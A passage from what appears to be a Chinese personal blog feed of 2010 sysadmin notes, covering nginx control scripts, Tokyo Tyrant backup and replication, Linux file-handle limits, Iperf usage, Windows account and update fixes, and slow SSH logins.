/usr/local/webserver/nginx/sbin/nginx    ;;         stop)                 kill -2 `ps -ef|grep “/usr/local/webserver/nginx/sbin/nginx”|grep -v “grep”|awk ‘{print $2}’ `                         ;;         restart)                 cd “$CMD”                 $0 stop                 $0 start         ;;         *)         echo $”Usage: $0 {start|stop|restart}”         exit 1 esac exit 0   ——————-[E]url_hash转发方式nginx启动、关闭脚本[E]——————– </p><p>更改该文件权限</p><p>Java代码</p><ol><li><p>chmod u+x nginx.sh  </p></li><li><p>启动 nginx ./nginx.sh start  </p></li><li>重启 nginx ./nginx.sh restart  </li><li>关闭 nginx ./nginx.sh stop</li></ol>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 将nginx配置成url_hash转发方式 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>VPN连不上，报错：Reason 442: failed to enable virtual adapter.</title>
      <link href="/2010/11/26/reason-442-failed-to-enable-virtual-adapter/"/>
      <url>/2010/11/26/reason-442-failed-to-enable-virtual-adapter/</url>
      <content type="html"><![CDATA[<p>VPN连不上，怎么办？  </p><p>点连接后，过一会儿出现一个对话框：<br>Secure VPN connection terminated locally by the client.<br>Reason 442: failed to enable virtual adapter.<br>Connection terminated on: 后面是日期</p><p>后来查出为cisco的虚拟网卡上Deterministic Network Enhancer协议没有启用，启用后再试就OK了</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> to </tag>
            
            <tag> 442 </tag>
            
            <tag> enable </tag>
            
            <tag> failed </tag>
            
            <tag> reason </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>/proc/sys/fs/file-max VS ulimit -n</title>
      <link href="/2010/11/24/proc-sys-fs-file-max-vs-ulimit-n/"/>
      <url>/2010/11/24/proc-sys-fs-file-max-vs-ulimit-n/</url>
      <content type="html"><![CDATA[<p>简单的说, max-file表示系统级别的能够打开的文件句柄的数量, 而ulimit -n控制进程级别能够打开的文件句柄的数量.  </p><p>man 5 proc, 找到file-max的解释：<br>file-max中指定了系统范围内所有进程可打开的文件句柄的数量限制(系统级别, kernel-level). （The value in file-max denotes the maximum number of file handles that the Linux kernel will allocate）.当收到”Too many open files in system”这样的错误消息时, 就应该曾加这个值了.  </p><p># cat /proc/sys/fs/file-max<br>4096<br># echo 100000 &gt; /proc/sys/fs/file-max  </p><p>或者<br># echo “”fs.file-max=65535” &gt;&gt; /etc/sysctl.conf<br># sysctl -p  </p><p>The kernel constant NR_OPEN imposes an upper limit on the value that may be placed in file-max. （这句啥子意思？ 没太明白）  </p><p>对于2.2的内核, 还需要考虑inode-max, 一般inode-max设置为file-max的4倍. 对于2.4及以后的内核, 没有inode-max这个文件了.  </p><p>file-nr 可以查看系统中当前打开的文件句柄的数量. 他里面包括3个数字： 第一个表示已经分配了的文件描述符数量, 第二个表示空闲的文件句柄数量, 第三个表示能够打开文件句柄的最大值（跟file-max一致）. 内核会动态的分配文件句柄, 但是不会再次释放他们（这个可能不适应最新的内核了, 在我的file-nr中看到第二列一直为0, 第一列有增有减）  </p><p>man bash, 找到说明ulimit的那一节：<br>提供对shell及其启动的进程的可用资源（包括文件句柄, 进程数量, core文件大小等）的控制. 这是进程级别的, 也就是说系统中某个session及其启动的每个进程能打开多少个文件描述符, 能fork出多少个子进程等…  </p><p>当达到上限时, 会报错”Too many open files”或者遇上Socket/File: Can’t open so many files等  </p><p>另外需要注意的是, 每种资源都有相关的软硬限制, 软限制是内核强加给相应资源的限制值,硬限制是软限制的最大值. 非授权调用进程只可以将其软限制指定为0~硬限制范围中的某个值,同时能不可逆转地降低其硬限制.授权进程可以任意改变其软硬限 制.RLIM_INFINITY的值表示不对资源限制.  </p><p>分别使用-H和-S选项来指定需要对资源是做硬限制/软限制的设置. 如果都不指定, 硬限制和软限制同时设置.  </p><p>打印资源的限制值, 如果不明确指定-H, 打印的是-S  </p><p>要改apache的ulimit, 可以在 /usr/sbin/apachectl 这个脚本中修改 ULIMIT_MAX_FILES 这个值  </p><p>可打开文件句柄数设置的太大, 有那些危害：<br>If the file descriptors are tcp sockets, etc, then you risk using up a large amount of memory for the socket buffers and other kernel objects; this memory is not going to be swappable.  </p><p>另外要记得的是socket connection也是文件.</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -n </tag>
            
            <tag> file-max </tag>
            
            <tag> ulimit </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Tokyo Tyrant（TTServer）-备份恢复和增加从库</title>
      <link href="/2010/11/23/tokyo-tyrant-ttserver-backup-recovery-and-increase-from-library/"/>
      <url>/2010/11/23/tokyo-tyrant-ttserver-backup-recovery-and-increase-from-library/</url>
      <content type="html"><![CDATA[<p>前面我们说了TTServer的使用，以及如何在开始的时候配置主从。在使用中它非常高效和可靠，那么如果我们的服务运行一段时间后，需要增加一个从库（ttserver）来分担压力或者用于负载均衡和HA，因为是线上系统，那么就不应该停机，那么我们应该怎么对数据进行备份和拷贝，然后启动一个slave从库呢？   </p><p><strong>1.如何备份和恢复</strong>  </p><pre><code>  登录到ttserver服务器，执行如下命令    ]# tcrmgr copy -port 11211 localhost  /data/backup.tch    localhost :ttserver主机名    /data/backup.tch  备份文件保存的路径，请注意，这里指ttserver所在机器的路径。  同样，也可以备份远程机器，    ]# tcrmgr copy -port 11211 remotehost  /data/backup.tch  备份文件将保存在remotehost的/data/backup.tch    接下来恢复数据就比较简单，直接替换掉原有ttserver的数据文件，启动就可以了。    这种方式适用于定期的数据备份，在出现灾难故障时可以恢复到某一个时间的数据。不适合用来增加从库时需要的数据库文件。  </code></pre><p><strong>2.如何不停机增加从库</strong>  </p><pre><code>从库需要进行同步，那么就需要有个文件的时间版本，防止数据冲突。  首先我们建立一个一个如下的脚本文件，存为&quot;backup.sh&quot;,并赋予执行权限(chmod 755 backup.sh)。比如存在：  </code></pre><p>/data/backup/路径下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#! /bin/sh  </span><br><span class="line">srcpath=&quot;$1&quot;  </span><br><span class="line">destpath=&quot;$1.$2&quot;  </span><br><span class="line">rm -f &quot;$destpath&quot;  </span><br><span class="line">cp -f &quot;$srcpath&quot; &quot;$destpath&quot;    接下执行如下命令，执行的时间会根据你的磁盘性能和数据大小而定。  </span><br><span class="line">tcrmgr copy -port 11211 masterhost &apos;@/data/backup/backup.sh&apos;</span><br></pre></td></tr></table></figure></p><p>materthost:主库主机名，请注意：backup.sh存放的路径是在materthost机器上。  </p><p>‘@/data/backup/backup.sh’  ：如果tcrmgr copy命令中，参数以@开始，那么后面的字符串作为命令行执行。  </p><p>执行完成后，我们进入ttserver的数据目录，执行ls -lh会发现类似下面的文件名，  </p><p>-rw-r–r–  1 root root 9.2G Aug 25 14:31 casket.tch.1251181588942889  </p><p>请确认产生casket.tch.xxxxx类似的文件名，xxxxx代表时间戳。  </p><p>接下来在从库salve上以我们备份的文件来运行ttserver，把时间错写入到一个时间戳文件ttserver.rts。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">]$ ls  </span><br><span class="line">]$ cp casket.tch.xxxxx casket.tch  </span><br><span class="line">]$ echo xxxxx &gt;ttserver.rts  </span><br><span class="line">]$ mkdir ulog  </span><br><span class="line">]$ ttserver -mhost masterhost -mport mport -port 11211 -ulog ulog -sid 2 -rts ttserver.rts  casket.tch</span><br></pre></td></tr></table></figure></p><p>运行后，ttserver将会以此时间戳进行同步。  </p><p>masterhost ：主库主机名  </p><p>mport :  主库端口号  </p><p>到此我们就完成了一个salve从库ttserver的增加。  </p><p><strong>3.小结</strong>  </p><p>  推荐备份也使用2中用到的方式，上面带上了时间戳，可以精确的知道数据的版本时间。  </p><p>  另外请注意：在使用此方法进行备份的时候，ttserver会在备份过程中一直保持同步阻塞和不修改数据。所以可以保证备份出来的版本跟时间戳的一致性。</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ttserver </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ttserver几种部署方式</title>
      <link href="/2010/11/23/ttserver-several-deployment-methods/"/>
      <url>/2010/11/23/ttserver-several-deployment-methods/</url>
      <content type="html"><![CDATA[<p>可以把ttserver理解成一种key-value形式的数据库，在运营中就像管理数据库一样去管理ttserver，使得性能和数据安全都能得到较好的保障。<br>部署ttserver的方式，可以根据访问量和数据规模循序渐进地这样部署：</p><p>1、单机：数据量不大，访问量不大<br>ttserver -host 192.168.0.100 -port 20001 -thnum 128 -dmn -ulim 1024m -ulog /home/ahfu/temp/test_data/test_ulog_01 -log /home/ahfu/temp/test_data/log/test_data_01.log -pid /home/ahfu/temp/test_data/log/test_data_01.pid -sid 1 /home/ahfu/temp/test_data/test_data_01.tch#bnum=10000000#rcnum=100000#xmsiz=256m<br>如果希望提高查询的性能，可以把hash的桶设置得再大些，然后缓存的记录多一些。<br>同时，设置-uas参数异步写入日志，可提高写入的性能。不过这样可能导致日志丢失，降低了数据安全性。</p><p>2、一主一备：数据量不大，访问量不大，且对数据安全性有要求<br>主服务器：(与上面一致)<br>ttserver -host 192.168.0.100 -port 20001 -thnum 128 -dmn -ulim 1024m -ulog /home/ahfu/temp/test_data/test_ulog_01 -log /home/ahfu/temp/test_data/log/test_data_01.log -pid /home/ahfu/temp/test_data/log/test_data_01.pid -sid 1 /home/ahfu/temp/test_data/test_data_01.tch#bnum=10000000#rcnum=100000#xmsiz=256m<br>备份服务器：在另一个机器上启动，不需要缓存<br>ttserver -host 192.168.0.101 -port 20002 -mhost 192.168.0.100 -mport 20001 -rcc -rts /home/ahfu/temp/test_data/test_data_01.rts -thnum 5 -dmn -ulim 1024m -ulog /home/ahfu/temp/test_data/test_ulog_02 -log /home/ahfu/temp/test_data/log/test_data_02.log -pid /home/ahfu/temp/test_data/log/test_data_02.pid -sid 2 /home/ahfu/temp/test_data/test_data_02.tch#bnum=10000000#rcnum=0#xmsiz=0m<br>备份服务器可以找性能不高的旧服务器，这种设置也只是为了保障数据安全而做的设置。</p><p>3、互为主备：数据量增大，访问量也增大，对数据安全有要求，且希望避免单点故障<br>第一个服务器：<br>ttserver -host 192.168.0.100 -port 20001 -mhost 192.168.0.101 -mport 20002 -rcc -rts /home/ahfu/temp/test_data/test_data_01.rts -thnum 128 -dmn -ulim 1024m -ulog /home/ahfu/temp/test_data/test_ulog_01 -log /home/ahfu/temp/test_data/log/test_data_01.log -pid /home/ahfu/temp/test_data/log/test_data_01.pid -sid 1 /home/ahfu/temp/test_data/test_data_01.tch#bnum=10000000#rcnum=100000#xmsiz=256m<br>第二个服务器：<br>ttserver -host 192.168.0.101 -port 20002 -mhost 192.168.0.100 -mport 20001 -rcc -rts /home/ahfu/temp/test_data/test_data_02.rts -thnum 128 -dmn -ulim 1024m -ulog /home/ahfu/temp/test_data/test_ulog_02 -log /home/ahfu/temp/test_data/log/test_data_02.log -pid /home/ahfu/temp/test_data/log/test_data_02.pid -sid 2 /home/ahfu/temp/test_data/test_data_02.tch#bnum=10000000#rcnum=100000#xmsiz=256m<br>应用程序可以访问任意一个服务器进行读写，且应用程序发现某服务器不能访问后，可立即转到另一台服务器。</p><p>4、读写分离：写量猛增，读量猛增<br>TokyoCabinet支持六种数据引擎，其中on-memory hash database和on-memory b+ database两种是将数据存放在内存中的，不对数据做持久化。<br>因此，可以使用on-memory hash database引擎的ttserver作为写服务器，然后采用复制的方式将on-memory hash database上的数据复制到hash database的多个ttserver上去，然后将多个hash database ttserver作为读服务器。这实际上是通过降低一致性来提高性能。<br>on-memory hash database的配置： 缓存的记录数和内存都配置得很小<br>ttserver -host 192.168.0.99 -port 20000 -thnum 128 -dmn -ulim 1024m -ulog /data/home/game/temp/test_data/test_ulog_01 -log /data/home/game/temp/test_data/log/test_data_01.log -pid /data/home/game/temp/test_data/log/test_data_01.pid -sid 0 “*#bnum=10000000#capnum=100#capsiz=10m”<br>hash database ttserver 1 的配置： 从on-memory hash database复制数据<br>ttserver -host 192.168.0.100 -port 20001 -mhost 192.168.0.99 -mport 20000 -rcc -rts /home/ahfu/temp/test_data/test_data_01.rts -thnum 128 -dmn -ulim 1024m -ulog /home/ahfu/temp/test_data/test_ulog_01 -log /home/ahfu/temp/test_data/log/test_data_01.log -pid /home/ahfu/temp/test_data/log/test_data_01.pid -sid 1 “/home/ahfu/temp/test_data/log/test_data_01.tch#bnum=10000000#rcnum=100000#xmsiz=256m”<br>hash database ttserver 2 的配置： 从on-memory hash database复制数据<br>ttserver -host 192.168.0.101 -port 20002 -mhost 192.168.0.99 -mport 20000 -rcc -rts /home/ahfu/temp/test_data/test_data_02.rts -thnum 128 -dmn -ulim 1024m -ulog /home/ahfu/temp/test_data/test_ulog_02 -log /home/ahfu/temp/test_data/log/test_data_02.log -pid /home/ahfu/temp/test_data/log/test_data_02.pid -sid 2 “/home/ahfu/temp/test_data/log/test_data_02.tch#bnum=10000000#rcnum=100000#xmsiz=256m”<br>配置为读写分离后，客户端写入的时候连接on-memory hash database，读取的时候连接其他的ttserver。</p><p>5、客户端实现分布，分库：海量数据<br>数据量再大，靠几台服务器已经无法支撑的时候，分库仍然是无奈的选择。将数据按照业务划分，或者按照某一数值划分，存在在多个ttserver群集中去。<br>客户端程序在写入或者读取的时候，自动根据业务规则去访问对应的群集即可。</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>怎样查看已加载模块的状态？，加载时的参数？</title>
      <link href="/2010/11/22/how-do-i-view-the-status-of-a-loaded-module-what-are-the-parameters-of-loading/"/>
      <url>/2010/11/22/how-do-i-view-the-status-of-a-loaded-module-what-are-the-parameters-of-loading/</url>
      <content type="html"><![CDATA[<p>1: 查看已加载模块使用lsmod命令可以进行查看.<br>2: modinfo<br>功能说明：显示kernel模块的信息。<br>语法：<br>modinfo [-0]  [-F field]  [modulename|filename …]<br>modinfo -V<br>modinfo -h<br>补充说明：modinfo会显示kernel模块的对象文件，以显示该模块的相关信息。<br>参数：<br>-F field 只打印指定的区域的信息。<br>-a 显示模块作者名称。<br>-d 显示模块的说明。<br>-l 显示模块的授权。<br>-n 显示模块的详细路径及名称。<br>-p 显示模块所支持的参数。<br>-h 显示帮助信息。<br>-V或–version 　显示版本信息。<br>详细参考帮助信息。<br>如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[root@192\_168\_168_53 ~]# modinfo bnx2  </span><br><span class="line">filename:       /lib/modules/2.6.18-164.el5PAE/kernel/drivers/net/bnx2.ko  </span><br><span class="line">version:        1.9.3  </span><br><span class="line">license:        GPL  </span><br><span class="line">description:    Broadcom NetXtreme II BCM5706/5708/5709/5716 Driver  </span><br><span class="line">author:         Michael Chan &lt;mchan@broadcom.com&gt;  </span><br><span class="line">srcversion:     D151EAED8C1037CA480DE9A  </span><br><span class="line">alias:          pci:v000014E4d0000163Csv\*sd\*bc\*sc\*i*  </span><br><span class="line">alias:          pci:v000014E4d0000163Bsv\*sd\*bc\*sc\*i*  </span><br><span class="line">alias:          pci:v000014E4d0000163Asv\*sd\*bc\*sc\*i*  </span><br><span class="line">alias:          pci:v000014E4d00001639sv\*sd\*bc\*sc\*i*  </span><br><span class="line">alias:          pci:v000014E4d000016ACsv\*sd\*bc\*sc\*i*  </span><br><span class="line">alias:          pci:v000014E4d000016AAsv\*sd\*bc\*sc\*i*  </span><br><span class="line">alias:          pci:v000014E4d000016AAsv0000103Csd00003102bc\*sc\*i*  </span><br><span class="line">alias:          pci:v000014E4d0000164Csv\*sd\*bc\*sc\*i*  </span><br><span class="line">alias:          pci:v000014E4d0000164Asv\*sd\*bc\*sc\*i*  </span><br><span class="line">alias:          pci:v000014E4d0000164Asv0000103Csd00003106bc\*sc\*i*  </span><br><span class="line">alias:          pci:v000014E4d0000164Asv0000103Csd00003101bc\*sc\*i*  </span><br><span class="line">depends:         </span><br><span class="line">vermagic:       2.6.18-164.el5PAE SMP mod_unload 686 REGPARM 4KSTACKS gcc-4.1  </span><br><span class="line">parm:           disable_msi:Disable Message Signaled Interrupt (MSI) (int)  </span><br><span class="line">parm:           enable_entropy:Allow bnx2 to populate the /dev/random entropy pool (int)  </span><br><span class="line">module_sig:     883f3504a8b963d18758d6145e11236c109d1659f6ec113f5c9750685b8424a0cf48c99d48709f4821894b64ca2fb928f595f8b9a45aab5788b  </span><br><span class="line">  </span><br><span class="line">[root@192\_168\_168_53 ~]# modinfo -p bnx2  </span><br><span class="line">enable_entropy:Allow bnx2 to populate the /dev/random entropy pool  </span><br><span class="line">disable_msi:Disable Message Signaled Interrupt (MSI)</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> modinfo </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ttyrpld – tty logging daemon</title>
      <link href="/2010/11/22/ttyrpld-tty-logging-daemon/"/>
      <url>/2010/11/22/ttyrpld-tty-logging-daemon/</url>
      <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p><em>ttyrpld</em> is a multi-os kernel-level tty logger (key- and screenlogger for ttys) with (a)synchronous replay supprt. It supports most tty types, including _vc_, bsd and unix98-style _pty_s (xterm/ssh), <em>serial</em>, <em>isdn</em>, etc. Being implemented within the kernel makes it unavoidable for the default user. It runs with no overhead if the logging daemon is not active.</p><h1 id="Technical-aspects"><a href="#Technical-aspects" class="headerlink" title="Technical aspects"></a>Technical aspects</h1><p><em>… which cause it to differ from existing solutions:</em></p><p>Most other solutions deploy the logging completely in userspace and make it dependent on the user to activate the logging. Definitely, an intruder does not start e.g. <code>/usr/bin/script</code> voluntarily. I have only seen few other kernel-based loggers. One of them is outdated, others query the x86 keyboard driver using interrupt hijacking and fixed translation. This is very unportable, because it only catches raw AT keyboard scancodes, but not USB or even other keyboards (unless they are in compatibility mode), and it does not work at all for network traffic.</p><p>Only the FreeBSD snooper <em>watch</em>, which operates on the <code>/dev/snp*</code> devices, can be taken for a comparison. However, it can only do the interactive live feed mode, no logging is possible for later replay. Packet time stamps are also missing.</p><h1 id="Components"><a href="#Components" class="headerlink" title="Components"></a>Components</h1><p>This kit (<em>ttyrpld</em>) consists of four components:</p><p><em>kpatch</em>: The kernel patch adds a few lines to provide the <em>rpldev</em> extension hooks, which (any) module can then get onto.</p><p><em>rpldev</em>: The kernel module is responsible for grabbing the data off the tty line and providing a character device for the user-space logging daemon. Data grabbed of the tty is directly passed to the overlying daemons, so with the correct terminal settings you can get a 1:1 replay.</p><p>For systems where module loading is not possible or not widely supported (OpenBSD for example), <em>rpldev</em> is integrated into the kpatch.</p><p><em>rpld</em>: Having received the captured data, the logging daemon can store them in any format and/or facility, with or without compression, just as it likes, for this happens in user-space and thus you have all the fluffy libraries available. (That would not be the case from kernel space.)</p><p><em>ttyreplay</em>: real-time log analyzer. Think of it as a simple video player.</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>强制umount</title>
      <link href="/2010/11/22/mandatory-umount/"/>
      <url>/2010/11/22/mandatory-umount/</url>
      <content type="html"><![CDATA[<p>今天发现umount有一个命令，umount -l可以强制卸载挂载，但要小心使用</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>win7本地用户和组找不到这一项怎么办？</title>
      <link href="/2010/11/22/what-if-the-local-user-and-group-can-t-find-this-item/"/>
      <url>/2010/11/22/what-if-the-local-user-and-group-can-t-find-this-item/</url>
      <content type="html"><![CDATA[<p>说明你的win7 是 家庭版的。<br>直接在开始菜单运行（按win徽标键和字母R键）框里面输入lusrmgr.msc ，如果不能弹出本地用户和组的界面，说明就是家庭版，或者lusrmgr.msc被精简掉了。<br>超级管理员=ADMINISTRATIOR  </p><p>1.默认状态下有Administrator身份却不能显示出来。需要打开注册表[开始-〉运行-〉regedit，并且你要有管理员权限]在HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\<br>下新建注册表项“SpecialAccounts”，再在其下新建子项“UserList”，然后新建一个名为“Administrator”的DWORD(32位)值，将其数值改成“1”（该步骤是要vista认识Administrator身份）；  </p><p>  2.开始，运行cmd，在DOS窗口下输入net user administrator    /active:yes（注意：/前有两个空格！否则运行会提示错误命令；该步骤是激活administrator用户）； （要开机按F8后进安全模式，在管理员权限下才能运行成功）  </p><p>  3.重启计算机或切换用户，这是应该能看到多出来了administrator用户，以administrator身份登陆即可！</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>网络性能测试工具Iperf上手指南</title>
      <link href="/2010/11/18/network-performance-testing-tool-iperf-upper-hand-guide/"/>
      <url>/2010/11/18/network-performance-testing-tool-iperf-upper-hand-guide/</url>
      <content type="html"><![CDATA[<p>Iperf是一个网络性能测试工具。可以测试TCP和UDP带宽质量，可以测量最大TCP带宽，具有多种参数和UDP特性，可以报告带宽，延迟抖动和数据包丢失。Iperf在linux和windows平台均有二进制版本供自由使用。</p><p>Iperf was developed by NLANRDAST as a modern alternative for measuring maximum TCP and UDP bandwidth performance. Iperf allows the tuning of various parameters and UDP characteristics. Iperf reports bandwidth, delay jitter, datagram loss.</p><p><strong>Iperf**</strong>使用方法与参数说明**</p><p><strong>参数说明</strong></p><p>-s 以server模式启动，eg：iperf –s 。Server端为数据的接收端。</p><p>-c host以client模式启动，host是server端地址，eg：iperf -c 222.35.11.23 。Client端为数据的发出端。</p><p><strong>通用参数</strong></p><p>-f [kmKM] 分别表示以Kbits, Mbits, KBytes, MBytes显示报告，默认以Mbits为单位,eg：iperf -c 222.35.11.23 -f K</p><p>-i sec 以秒为单位显示报告间隔，eg：iperf -c 222.35.11.23 -i 2</p><p>-l 缓冲区大小，默认是8KB,eg：iperf -c 222.35.11.23 -l 16</p><p>-m 显示tcp最大mtu值</p><p>-o 将报告和错误信息输出到文件eg：iperf -c 222.35.11.23 -o ciperflog.txt</p><p>-p 指定服务器端使用的端口或客户端所连接的端口eg：iperf -s -p 9999;iperf -c 222.35.11.23 -p 9999</p><p>-u 使用udp协议</p><p>-w 指定TCP窗口大小，默认是8KB</p><p>-B 绑定一个主机地址或接口（当主机有多个地址或接口时使用该参数）</p><p>-C 兼容旧版本（当server端和client端版本不一样时使用）</p><p>-M 设定TCP数据包的最大mtu值</p><p>-N 设定TCP不延时</p><p>-V 传输ipv6数据包</p><p><strong>server**</strong>专用参数**</p><p>-D 以服务方式运行ipserf，eg：iperf -s -D</p><p>-R 停止iperf服务，针对-D，eg：iperf -s -R</p><p><strong>client**</strong>端专用参数**</p><p>-d 同时进行双向传输测试</p><p>-n 指定传输的字节数，eg：iperf -c 222.35.11.23 -n 100000</p><p>-r 单独进行双向传输测试</p><p>-t 测试时间，默认10秒,eg：iperf -c 222.35.11.23 -t 5</p><p>-F 指定需要传输的文件</p><p>-T 指定ttl值</p><p><strong>应用实例</strong></p><p>使用 iperf -s 命令将 Iperf 启动为 server 模式，在客户机上使用 iperf -c启动client模式。</p><p>iperf –s</p><p>------------------------------------------------------------</p><p>Server listening on TCP port 5001</p><p>TCP window size: 8.00 KByte (default)</p><p>------------------------------------------------------------</p><p>iperf -c 59.125.103.56</p><p>上面使用服务端和客户端的默认设置进行测试</p><p>iperf -s -w 300K</p><p>------------------------------------------------------------</p><p>Server listening on TCP port 5001</p><p>TCP window size: 300 KByte</p><p>------------------------------------------------------------</p><p>iperf -c 59.125.103.56 -f K -i 2 -w 300K</p><p> 设定报告间隔为2秒，服务器端和客户端的TCP窗口都开到300KB</p><p>iperf -c 59.125.103.56 -f K -i 2 -w 300K –n 1000000</p><p>测试传输约1MB数据</p><p>iperf -c 59.125.103.56 -f K -i 2 -w 300K –t 36</p><p>测试持续36秒</p><p>iperf -c 59.125.103.56 -f K -i 2 -w 300K -n 10400000 –d</p><p>测试双向的传输</p><p>iperf -c 59.125.103.56 -f K -i 2 -w 300K –u</p><p>UDP测试</p><p>其中 -i 参数的含义是周期性报告的时间间隔（interval），单位为秒；在上面的例子中，表示每隔2秒报告一次带宽等信息。</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>这句话写得不错</title>
      <link href="/2010/11/18/this-sentence-is-well-written/"/>
      <url>/2010/11/18/this-sentence-is-well-written/</url>
      <content type="html"><![CDATA[<p>不经历风雨怎能见彩虹！如果你要创业的话，你所要学会的是放弃，放弃你安定的生活； 如果你要创业的话，你所要学会的是坚定，坚定你的理想； 如果你要创业的话，你所要学会的是执着，执着别人认为是不可能的事情</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>dell R610网卡驱动问题</title>
      <link href="/2010/11/18/dell-r610-network-card-driver-problem/"/>
      <url>/2010/11/18/dell-r610-network-card-driver-problem/</url>
      <content type="html"><![CDATA[<p>网卡驱动升级到2.0.8E</p><p>/etc/modprobe.conf中添加</p><p>options bnx2 disable_msi=1</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>自动更新变成灰色</title>
      <link href="/2010/11/18/automatic-update-turns-gray/"/>
      <url>/2010/11/18/automatic-update-turns-gray/</url>
      <content type="html"><![CDATA[<p>故障现象:  </p><p>发现我的电脑—属性—自动更新里面所有的按钮都已经是灰色的了，<br>而且每次开机都会自动运行自动更新，关闭进程也无法停止，几秒钟后又会开始更新.  </p><p>控制面板里的安全中心显示“自动更新”已经打开，而且关闭选项也是灰色的！  </p><ol><li></li></ol><p>开始-运行- 输入gpedit.msc (XP pro) 计算机配置-管理模板-windows组件-windows update: 右边： 1.双击配置自动更新：选择“已启用”，确定。 2.双击“指定intranet microsoft更新位置”，选择“未配置”，确定。 此时系统将通过连接微站点自动更新。  </p><ol start="2"><li></li></ol><p>开始－运行－services.msc，看看你的服务里的Automatic Update 是不是启动的，自动的就可以了，没有右键进行修改！ 修改成关闭或手动.  </p><ol start="3"><li></li></ol><p>开始-运行-regedit,打开注册表编辑器,在注册表里找:<br>HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows,展开Windows,将其下的WindowsUpdate删除掉,现在  </p><p>再打开自动更新选项看是不是可以选择了?<br>由于WindowsUpdate这一项是别的软件添加进去的,并非windows自行添加,所以可以放心删除.  </p><p>在没删除WindowsUpdate之前,在自动更新里会默认的帮你选择某一项,如果不愿意删除WindowsUpdate(或者原来就没有WindowsUpdate这个东西),也可在组策略里修改是否启用自动更新:<br>开始-运行-gpedit.msc,计算机配置-管理模板-Windows组件-Windows Update,在右边的窗口中双击配置自动更新选择启用或禁用即可.平时要多留意事物~~OK  </p><ol start="4"><li></li></ol><p>windows自动更新不能开启  </p><p>控制面板-自动更新里所用可供选择的项目都呈灰色，选择的是关闭自动更新；<br>最近安装宽带上网后总是出现病毒，会不会和这个有关？<br>金山漏洞修复也是在下载几个更新后自动关闭了。  </p><p>首先确保自动更新的服务开启:<br>检查方法:依次单击”开始”–运行–输入”services.msc”打开服务管理,双击”AutomaticUpdates”,点”启动”按钮并将”启动类型”设为”自动”.<br>其次,可能是注册表限制了自动更新,可以用组策略更改:<br>单击“开始”-运行–gpedit.msc，打开组策略，<br>依次选择“计算机配置”-管理模板-WINDOWS组件–WINDOWS UPDATE，双击右边窗口“配置自动更新属性”，选择“未配置”即可。<br>还不行的话，重新打开选择“已启用”试试.</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ssh登录很慢的问题</title>
      <link href="/2010/11/15/ssh-login-is-slow/"/>
      <url>/2010/11/15/ssh-login-is-slow/</url>
      <content type="html"><![CDATA[<p>登录很慢，登录上去后速度正常，这种情况主要有两种可能的原因：<br>1. DNS反向解析的问题<br>OpenSSH在用户登录的时候会验证IP，它根据用户的IP使用反向DNS找到主机名，再使用DNS找到IP地址，最后匹配一下登录的IP是否合法。如果客户机的IP没有域名，或者DNS服务器很慢或不通，那么登录就会很花时间。<br>解决办法：<br>只需修改/etc/ssh/sshd_config，设置UseDNS为no即可：<br>sed -i “s/#UseDNS yes/UseDNS no/“  /etc/ssh/sshd_config<br>2. gssapi的问题<br>用ssh -v user@server 可以看到登录时有如下信息：<br>debug1: Next authentication method: gssapi-with-mic<br>debug1: Unspecified GSS failure.  Minor code may provide more information<br>解决办法：<br>可以使用ssh  -o GSSAPIAuthentication=no user@server登录<br>也可以修改/etc/ssh/ssh_config，设置GSSAPIAuthentication no</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
